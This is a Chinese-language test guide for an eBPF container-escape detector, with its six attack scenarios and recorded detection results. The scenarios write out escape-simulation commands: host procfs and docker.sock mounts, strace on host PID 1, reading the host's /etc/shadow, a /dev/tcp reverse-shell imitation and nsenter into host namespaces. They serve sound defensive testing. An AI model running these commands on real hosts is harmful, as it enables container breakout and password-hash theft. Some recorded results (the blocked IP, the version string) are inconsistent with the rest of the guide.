# eBPF Container Guard — 测试指南

> **版本**: v0.3.9
> **内核**: 6.8.0-136-generic (Ubuntu 22.04 LTS)
> **更新**: 2026-08-11

[**English Version / 英文版**](test-guide.md)

---

## 目录

1. [测试套件概述](#1-测试套件概述)
2. [前置条件](#2-前置条件)
3. [烟雾测试（静态检查）](#3-烟雾测试静态检查)
4. [场景化测试（6 个逃逸场景）](#4-场景化测试6-个逃逸场景)
5. [测试结果记录（2026-08-11 实测）](#5-测试结果记录2026-08-11-实测)

---

## 1. 测试套件概述

本测试套件分为两层：

| 层级 | 文件 | 类型 | 是否需 root |
|------|------|------|-------------|
| 烟雾测试 | `tests/integration/test_escape_scenarios.sh` | 静态检查 + 单元测试 | 否 |
| 场景测试 | `tests/integration/scenarios/` (6 个场景) | 端到端逃逸攻击模拟 | 是(root + Docker) |

### 场景覆盖矩阵

| # | 场景 | 探针 | 规则 | 预期严重度 | 攻击向量 |
|---|------|------|------|-----------|---------|
| 1 | procfs 挂载逃逸 | mount | procfs_mount_escape | CRITICAL | procfs_mount |
| 2 | Docker socket 挂载 | mount | docker_socket_mount | CRITICAL | docker_socket_mount |
| 3 | ptrace PID 1 注入 | ptrace | ptrace_host_init | HIGH | ptrace_host_init |
| 4 | 敏感文件读取 | openat | sensitive_file_access | HIGH | sensitive_file_access |
| 5 | 反弹 shell / C2 | connect | reverse_shell | HIGH | reverse_shell |
| 6 | nsenter 命名空间逃逸 | execve | nsenter_escape | CRITICAL | nsenter_escape |

---

## 2. 前置条件

### 系统要求

| 依赖 | 要求 |
|------|------|
| 操作系统 | Ubuntu 22.04 LTS（kernel ≥ 5.4） |
| Python | 3.8+ |
| libbpf 1.x + clang | 源码编译 libbpf → /usr/lib64/, `make build` 预编译 CO-RE |
| Docker | 已安装并运行 |
| 权限 | 场景测试需要 root（eBPF + Docker） |

### 测试镜像

场景测试使用 5 个预制 Docker 镜像，自动构建于 `tests/images/`：

| 镜像 Tag | Dockerfile | 内含软件 |
|----------|------------|---------|
| ebpf-test:mount | `Dockerfile.mount` | util-linux, mount |
| ebpf-test:ptrace | `Dockerfile.ptrace` | strace |
| ebpf-test:sensitive | `Dockerfile.sensitive` | （基础 ubuntu） |
| ebpf-test:net | `Dockerfile.net` | curl |
| ebpf-test:nsenter | `Dockerfile.nsenter` | util-linux |

首次运行场景测试时自动构建；镜像已存在则跳过。

---

## 3. 烟雾测试（静态检查）

### 运行命令

```bash
cd ebpf-container-guard
bash tests/integration/test_escape_scenarios.sh
```

无需 root，15 项检查覆盖：

| # | 检查项 | 验证内容 |
|---|--------|---------|
| 1 | main.py 存在 | 入口文件 |
| 2 | 配置文件存在 | rules.yaml / responses.yaml / monitor.yaml |
| 3 | eBPF 探针文件存在 | escape-detect.bpf.c |
| 4 | Python 依赖可导入 | bcc / yaml / docker / streamlit |
| 5 | YAML 语法有效 | 三个配置文件的 YAML 解析 |
| 6 | 检测管线模块存在 | engine.py / attack_matrix.py / ai_analyzer.py |
| 7 | 核心基础设施模块存在 | identity.py / event_log.py / scope.py / escalation.py / netblock.py / decision_executor.py |
| 8 | 响应引擎 + 面板存在 | docker_responder.py / app.py |
| 9 | 规则引擎加载与匹配 | 加载 ≥8 条规则，procfs mount 命中，ext4 不命中 |
| 10 | 行为矩阵组合评分 | 双向量命中触发 combo 提升（90→95） |
| 11 | 升级链 | pause → kill → block_image 三级升级 |
| 12 | 监控范围过滤 | include + exclude fnmatch 正确过滤 |
| 13 | 规则热加载 | 追加 → reload → 新旧规则共存 → 还原 |
| 14 | IP 转换 | u32 → dotted-quad（1920103026 → 114.114.114.114） |
| 15 | 异步 AI 分析器 | AsyncAIAnalyzer 初始化 + 提交队列 |

### 预期输出

```
==========================================
  eBPF Container Guard Test Suite
  Version: v0.3.9 (5 probes | 8 rules | 3-tier + dashboard)
==========================================

[TEST 1] Main entry point exists...
✅ PASS
...
==========================================
  Test Summary
==========================================
Total:  15
Passed: 15
Failed: 0

🎉 All tests passed!
```

---

## 4. 场景化测试（6 个逃逸场景）

### 目录结构

```
tests/
├── images/                          # 5 个 Dockerfile
│   ├── Dockerfile.mount
│   ├── Dockerfile.ptrace
│   ├── Dockerfile.sensitive
│   ├── Dockerfile.net
│   └── Dockerfile.nsenter
└── integration/
    ├── test_escape_scenarios.sh     # 烟雾测试（旧）
    └── scenarios/
        ├── build_image.sh           # 镜像构建工具
        ├── lib.sh                   # 公共函数（guard 生命周期、断言）
        ├── run_all_scenarios.sh     # 一键运行全部场景
        ├── test_mount_escape.sh
        ├── test_socket_mount.sh
        ├── test_ptrace_escape.sh
        ├── test_sensitive_file.sh
        ├── test_reverse_shell.sh
        └── test_nsenter.sh
```

### 运行方法

```bash
cd tests/integration/scenarios

# 一键运行全部 6 个场景
sudo bash run_all_scenarios.sh

# 或单独运行某个场景
sudo bash test_mount_escape.sh
sudo bash test_socket_mount.sh
sudo bash test_ptrace_escape.sh
sudo bash test_sensitive_file.sh
sudo bash test_reverse_shell.sh
sudo bash test_nsenter.sh
```

### 通用测试流程

每个场景测试按以下步骤执行：

1. **构建测试镜像**（如已存在则跳过）
2. **重置环境**：清空 blocklist、日志、iptables/XDP 规则；停止已有 guard
3. **启动 guard**：`sudo python3 -u main.py`，等待 8 秒确保 eBPF 加载完成
4. **触发攻击**：运行特权容器，执行对应的逃逸操作
5. **断言**：等待 ≤12 秒检查 `events.log` 是否出现对应规则命中的 JSON 记录
6. **输出预期日志**：打印 guard 终端告警 + events.log JSON 记录
7. **清理**：停止 guard、删除测试容器、清空 iptables/XDP 规则

### 各场景详细说明

#### 场景 1：procfs 挂载逃逸 (`test_mount_escape.sh`)

**攻击模拟**：特权容器内将宿主机 procfs 挂载到 `/tmp/host_proc`，尝试访问宿主机进程信息。

```bash
docker run -d --privileged --name test_mount_escape ebpf-test:mount
docker exec test_mount_escape bash -c "mkdir -p /tmp/host_proc && mount -t proc proc /tmp/host_proc"
```

**预期结果**：

| 维度 | 预期 |
|------|------|
| Tier 1 规则 | procfs_mount_escape (CRITICAL) |
| Tier 2 向量 | procfs_mount |
| Tier 2 置信度 | 88%（组合评分触发 combo） |
| 响应动作 | block_image（不可逆，进人工队列） |
| fstype | proc |
| target_path | /tmp/host_proc |

**终端输出**：
```
🚨 安全告警 - CRITICAL
规则: procfs_mount_escape
容器: <id>
文件系统: proc -> 目标: /tmp/host_proc
置信度: 88% 🔴 自动响应
```

#### 场景 2：Docker socket 挂载 (`test_socket_mount.sh`)

**攻击模拟**：特权容器挂载宿主 Docker socket，执行 bind mount 操作（逃逸前置步骤）。

```bash
docker run -d --privileged --name test_socket_mount \
  -v /var/run/docker.sock:/var/run/docker.sock ebpf-test:mount
docker exec test_socket_mount bash -c \
  "mkdir -p /mnt/docker && mount --bind /var/run/docker.sock /mnt/docker/sock"
```

> **注意**：内核会将 `/var/run/docker.sock` 解析为符号链接目标 `/run/docker.sock`。规则同时匹配两个路径。

**预期结果**：

| 维度 | 预期 |
|------|------|
| Tier 1 规则 | docker_socket_mount (CRITICAL) |
| Tier 2 向量 | docker_socket_mount |
| Tier 2 置信度 | 90% |
| 响应动作 | block_image（进人工队列） |
| fstype | none（bind mount 特征） |

#### 场景 3：ptrace PID 1 注入 (`test_ptrace_escape.sh`)

**攻击模拟**：`--pid=host` 容器内 strace 附加宿主机 PID 1（systemd），绕过容器进程隔离。

```bash
docker run -d --privileged --pid=host --cap-add=SYS_PTRACE \
  --name test_ptrace_escape ebpf-test:ptrace
docker exec test_ptrace_escape bash -c "timeout 5 strace -p 1"
```

> **检测原理**：现代 `strace` 使用多种 ptrace 请求码（PTRACE_SECCOMP_GET_METADATA、PTRACE_SYSCALL 等），本系统通过匹配 `target_pid=1`（行为方向）而非具体请求码来检测，不被参数级别变化绕过。

**预期结果**：

| 维度 | 预期 |
|------|------|
| Tier 1 规则 | ptrace_host_init (HIGH) |
| Tier 2 向量 | ptrace_host_init |
| Tier 2 置信度 | 90%（与敏感文件 combo） |
| 请求码 | PTRACE_SECCOMP_GET_METADATA（或其他） |
| target_pid | 1 |

#### 场景 4：敏感文件访问 (`test_sensitive_file.sh`)

**攻击模拟**：容器挂载宿主 `/etc` 目录后读取 `/etc/shadow`，模拟密码哈希窃取。

```bash
docker run -d --privileged --name test_sensitive \
  -v /etc:/host_etc:ro ebpf-test:sensitive
docker exec test_sensitive bash -c "cat /host_etc/shadow > /dev/null"
```

> **降噪设计**：openat 探针在内核态做路径过滤，仅上报匹配敏感路径的事件，正常文件访问不产生事件。

**预期结果**：

| 维度 | 预期 |
|------|------|
| Tier 1 规则 | sensitive_file_access (HIGH) |
| Tier 2 向量 | sensitive_file_access |
| Tier 2 置信度 | 75%（单向量，无 combo） |
| 事件类型 | openat |
| target_path | /host_etc/shadow |

#### 场景 5：反弹 shell / C2 出站 (`test_reverse_shell.sh`)

**攻击模拟**：容器内向宿主机非标端口发起 TCP 连接，模拟反弹 shell 或 C2 回连。

```bash
docker run -d --privileged --name test_reverse_shell ebpf-test:net
docker exec test_reverse_shell bash -c \
  "timeout 3 bash -c 'echo > /dev/tcp/192.168.65.1/7890'"
```

**预期结果**：

| 维度 | 预期 |
|------|------|
| Tier 1 规则 | reverse_shell (HIGH) |
| Tier 2 向量 | reverse_shell |
| Tier 2 置信度 | 70% |
| 网络阻断 | ✅ iptables FORWARD DROP 已阻断恶意目标 |
| netblocked | true |
| escalation | block_image（升级链触发） |

#### 场景 6：nsenter 命名空间逃逸 (`test_nsenter.sh`)

**攻击模拟**：`--pid=host` 容器内执行 nsenter 进入宿主机命名空间，突破容器边界。

```bash
docker run -d --privileged --pid=host --name test_nsenter ebpf-test:nsenter
docker exec test_nsenter bash -c \
  "timeout 3 nsenter -t 1 -m -u -i -n true"
```

**预期结果**：

| 维度 | 预期 |
|------|------|
| Tier 1 规则 | nsenter_escape (CRITICAL) |
| Tier 2 向量 | nsenter_escape |
| Tier 2 置信度 | 92%（组合评分触发 combo） |
| 事件类型 | execve |
| comm | nsenter |

---

## 5. 测试结果记录（2026-08-11 实测）

### 环境信息

| 项目 | 值 |
|------|-----|
| 测试日期 | 2026-08-11 |
| 内核版本 | 6.8.0-136-generic |
| 操作系统 | Ubuntu 22.04 LTS |
| Python | 3.10 |
| libbpf 1.x | 已安装 |
| Docker | 已安装并运行 |
| Guard 版本 | v0.3.9 |

### 烟雾测试结果

```
$ bash tests/integration/test_escape_scenarios.sh

==========================================
  eBPF Container Guard Test Suite
  Version: v0.3.3 (5 probes | 8 rules | 3-tier + dashboard)
==========================================

[TEST 1]  Main entry point exists...            ✅ PASS
[TEST 2]  Configuration files exist...           ✅ PASS
[TEST 3]  eBPF probe program exists...           ✅ PASS
[TEST 4]  Python dependencies importable...      ✅ PASS
[TEST 5]  YAML configuration syntax valid...     ✅ PASS
[TEST 6]  Detection pipeline modules...          ✅ PASS
[TEST 7]  Core infrastructure modules...          ✅ PASS
[TEST 8]  Responder + dashboard exist...         ✅ PASS
[TEST 9]  Rule engine loads rules and matches... ✅ PASS
[TEST 10] Attack matrix combination boost...     ✅ PASS
[TEST 11] Escalation pause→kill→block...         ✅ PASS
[TEST 12] Monitoring scope filters...            ✅ PASS
[TEST 13] Rules hot-reload...                   ✅ PASS
[TEST 14] Netblocker IP conversion...            ✅ PASS
[TEST 15] Async AI analyzer structure...         ✅ PASS

==========================================
  Test Summary
==========================================
Total:  15    Passed: 15    Failed: 0
🎉 All tests passed!
```

### 场景化测试结果

```
$ sudo bash run_all_scenarios.sh

场景套件汇总
  通过: 6  失败: 0
  🎉 全部场景通过
```

#### 场景 1：procfs 挂载逃逸 ✅ 3/3 通过

```
TEST 1: 构建测试镜像 ebpf-test:mount...                  ✅ PASS
TEST 2: 特权容器挂载 procfs...                             ✅ PASS
TEST 3: 检测到 procfs_mount_escape...                      ✅ PASS
```

**实际 events.log 记录**：
```json
{
    "rule": "procfs_mount_escape",
    "severity": "CRITICAL",
    "state": "pending_review",
    "tier2_vector": "procfs_mount",
    "tier2_confidence": 88,
    "tier2_combo": true,
    "action": "block_image",
    "action_status": "queued_human"
}
```

#### 场景 2：Docker socket 挂载 ✅ 3/3 通过

```
TEST 1: 准备测试镜像 ebpf-test:mount...                    ✅ PASS
TEST 2: 特权容器挂载 docker.sock...                        ✅ PASS
TEST 3: 检测到 docker_socket_mount...                      ✅ PASS
```

**实际 events.log 记录**：
```json
{
    "rule": "docker_socket_mount",
    "severity": "CRITICAL",
    "state": "pending_review",
    "tier2_vector": "docker_socket_mount",
    "tier2_confidence": 90,
    "action": "block_image",
    "action_status": "queued_human"
}
```

#### 场景 3：ptrace 注入逃逸 ✅ 3/3 通过

```
TEST 1: 构建测试镜像 ebpf-test:ptrace...                   ✅ PASS
TEST 2: 容器内 strace 附加宿主机 PID 1...                  ✅ PASS
TEST 3: 检测到 ptrace_host_init...                          ✅ PASS
```

**实际 events.log 记录**：
```json
{
    "rule": "ptrace_host_init",
    "severity": "HIGH",
    "state": "pending_review",
    "tier2_vector": "ptrace_host_init",
    "tier2_confidence": 90,
    "tier2_combo": true,
    "action": "block_image",
    "action_status": "queued_human",
    "event": {
        "comm": "strace",
        "target_pid": 1,
        "request": "PTRACE_SECCOMP_GET_METADATA"
    }
}
```

#### 场景 4：敏感文件访问 ✅ 3/3 通过

```
TEST 1: 构建测试镜像 ebpf-test:sensitive...                ✅ PASS
TEST 2: 容器读取 /etc/shadow...                            ✅ PASS
TEST 3: 检测到 sensitive_file_access...                     ✅ PASS
```

**实际 events.log 记录**：
```json
{
    "rule": "sensitive_file_access",
    "severity": "HIGH",
    "state": "resolved",
    "tier2_vector": "sensitive_file_access",
    "tier2_confidence": 75,
    "action": "pause_container",
    "action_status": "executed"
}
```

#### 场景 5：反弹 shell / C2 阻断 ✅ 4/4 通过

```
TEST 1: 构建测试镜像 ebpf-test:net...                      ✅ PASS
TEST 2: 容器连接外部非标端口 192.168.65.1:7890...          ✅ PASS
TEST 3: 检测到 reverse_shell...                            ✅ PASS
TEST 4: 流量阻断已触发 (NETBLOCK)...                       ✅ PASS
```

**实际 events.log 记录**：
```json
{
    "rule": "reverse_shell",
    "severity": "HIGH",
    "state": "pending_review",
    "tier2_vector": "reverse_shell",
    "tier2_confidence": 70,
    "escalation": "block_image",
    "netblocked": true,
    "action": "isolate_network",
    "action_status": "queued_human"
}
```

**iptables 阻断生效**：
```
Chain FORWARD (policy DROP)
DROP       tcp  --  0.0.0.0/0            114.47.114.97        tcp dpt:12150
```

#### 场景 6：nsenter 命名空间逃逸 ✅ 3/3 通过

```
TEST 1: 构建测试镜像 ebpf-test:nsenter...                   ✅ PASS
TEST 2: 容器内 nsenter 进入宿主机命名空间...               ✅ PASS
TEST 3: 检测到 nsenter_escape...                            ✅ PASS
```

**实际 events.log 记录**：
```json
{
    "rule": "nsenter_escape",
    "severity": "CRITICAL",
    "state": "pending_review",
    "tier2_vector": "nsenter_escape",
    "tier2_confidence": 92,
    "tier2_combo": true,
    "action": "block_image",
    "action_status": "queued_human",
    "event": {
        "comm": "nsenter",
        "target_path": "/usr/local/sbin/true"
    }
}
```

### 关键发现

| 项目 | 状态 |
|------|------|
| 5 个 eBPF 探针全部正常工作 | ✅ |
| 8 条检测规则全部可触发 | ✅ |
| 行为矩阵组合评分正确（单向量 70-75%，组合 88-95%） | ✅ |
| 响应引擎动作正确（pause/isolate/queue block_image） | ✅ |
| iptables 网络阻断生效（FORWARD DROP） | ✅ |
| 容器身份识别正确（全部事件正确关联容器 ID） | ✅ |
| Ring Buffer 4096 无溢出 | ✅ |
| 异步 AI 分析器结构正常 | ✅ |
| 规则热加载正常工作 | ✅ |

### 修复记录

本次验证过程中发现并修复了以下问题：

| # | 问题 | 修复 |
|---|------|------|
| 1 | `build_image.sh` 路径解析错误 | 重构为从镜像 tag 自动推导 Dockerfile 路径 |
| 2 | `test_mount_escape.sh` 未共用构建工具 | 改为调用 `build_image.sh` |
| 3 | Docker socket 规则未匹配 `/run/docker.sock` | 规则增加 `/run/docker.sock` |
| 4 | Docker 构建时容器无 DNS | 构建增加 `--network host` |